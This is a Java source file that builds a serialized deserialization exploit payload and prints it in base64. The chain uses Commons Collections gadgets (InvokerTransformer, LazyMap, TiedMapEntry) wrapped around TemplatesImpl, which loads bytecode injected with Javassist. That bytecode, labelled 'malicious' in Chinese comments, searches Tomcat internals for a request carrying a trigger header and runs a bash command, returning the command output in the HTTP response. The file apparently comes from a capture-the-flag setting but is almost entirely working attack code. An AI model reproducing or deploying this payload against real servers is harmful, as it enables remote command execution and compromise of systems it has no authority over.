import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import sun.misc.BASE64Encoder;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

import java.io.ObjectOutputStream;
public class Temp {
    public static class StaticBlock { }
    public static void main(String[] args) throws Exception {

        // 生成恶意 bytecodes
        String code = "try {\n" +
                "            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField(\"context\");\n" +
                "            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField(\"service\");\n" +
                "            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField(\"req\");\n" +
                "            java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(\"getHandler\",null);" +
                "            contextField.setAccessible(true);\n" +
                "            serviceField.setAccessible(true);\n" +
                "            requestField.setAccessible(true);\n" +
                "            getHandlerMethod.setAccessible(true);\n" +
                "            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =\n" +
                "                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();\n" +
                "            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());\n" +
                "            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);\n" +
                "            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();\n" +
                "            for (int i=0;i<connectors.length;i++) {\n" +
                "                if (4==connectors[i].getScheme().length()) {\n" +
                "                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();\n" +
                "                    if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) {\n" +
                "                        Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();\n" +
                "                        for (int j = 0; j < classes.length; j++) {\n" +
                "                            if (52 == (classes[j].getName().length())||60 == (classes[j].getName().length())) {\n" +
                "                                java.lang.reflect.Field globalField = classes[j].getDeclaredField(\"global\");\n" +
                "                                java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField(\"processors\");\n" +
                "                                globalField.setAccessible(true);\n" +
                "                                processorsField.setAccessible(true);\n" +
                "                                org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler,null));\n" +
                "                                java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);\n" +
                "                                for (int k = 0; k < list.size(); k++) {\n" +
                "                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(list.get(k));\n" +
                "                                    if (\"c014\".equals(tempRequest.getHeader(\"c014\"))) {\n" +
                "                                        org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);\n" +
                "                                        String cmd = tempRequest.getHeader(\"X-FLAG\");\n" +
                "                                        String[] cmds =  new String[]{\"/bin/bash\", \"-c\", \"whoami\"};\n" +
                "                                        java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();\n" +
                "                                        java.util.Scanner s = new java.util.Scanner(in).useDelimiter(\"\\\\a\");\n" +
                "                                        String output = s.hasNext() ? s.next() : \"\";\n" +
                "                                        java.io.Writer writer = request.getResponse().getWriter();\n" +
                "                                        java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField(\"usingWriter\");\n" +
                "                                        usingWriter.setAccessible(true);\n" +
                "                                        usingWriter.set(request.getResponse(), Boolean.FALSE);\n" +
                "                                        writer.write(output);\n" +
                "                                        writer.flush();\n" +
                "                                        break;\n" +
                "                                    }\n" +
                "                                }\n" +
                "                                break;\n" +
                "                            }\n" +
                "                        }\n" +
                "                    }\n" +
                "                    break;\n" +
                "                }\n" +
                "            }\n" +
                "        }catch (Exception e){\n" +
                "        }";
//        String code = "{java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\");}";
        ClassPool pool = ClassPool.getDefault();
        // 父类必须是 AbstractTranslet
        CtClass clazz = pool.get(StaticBlock.class.getName());
        clazz.setSuperclass(pool.get(Class.forName("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet").getName()));
        clazz.makeClassInitializer().insertBefore(code);
        byte[] bytecodes = clazz.toBytecode();
        // 实例化类并设置属性
        TemplatesImpl templatesimpl = new TemplatesImpl();
        Field fieldByteCodes = templatesimpl.getClass().getDeclaredField("_bytecodes");
        fieldByteCodes.setAccessible(true);
        fieldByteCodes.set(templatesimpl, new byte[][]{bytecodes});
        Field fieldName = templatesimpl.getClass().getDeclaredField("_name");
        fieldName.setAccessible(true);
        fieldName.set(templatesimpl, "name");
        Field fieldTfactory = templatesimpl.getClass().getDeclaredField("_tfactory");
        fieldTfactory.setAccessible(true);
        fieldTfactory.set(templatesimpl, Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl").newInstance());

        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        Map hashMap = new HashMap();
        Map lazyMap = LazyMap.decorate(hashMap, transformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templatesimpl);

        HashSet hashSet = new HashSet(1);
        hashSet.add("c014");
        Field fmap = hashSet.getClass().getDeclaredField("map");
        fmap.setAccessible(true);
        HashMap innimpl = (HashMap) fmap.get(hashSet);
        Field ftable = hashMap.getClass().getDeclaredField("table");
        ftable.setAccessible(true);
        Object[] nodes =(Object[])ftable.get(innimpl);
        Object node = nodes[1];
        Field fnode = node.getClass().getDeclaredField("key");
        fnode.setAccessible(true);
        fnode.set(node, tiedMapEntry);

        Field f = transformer.getClass().getDeclaredField("iMethodName");
        f.setAccessible(true);
        f.set(transformer, "newTransformer");


        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);

        oos.writeObject(hashSet);
        byte[] exp = baos.toByteArray();
        BASE64Encoder base64 = new BASE64Encoder();
        System.out.println(base64.encode(exp));
        oos.close();
    }
}
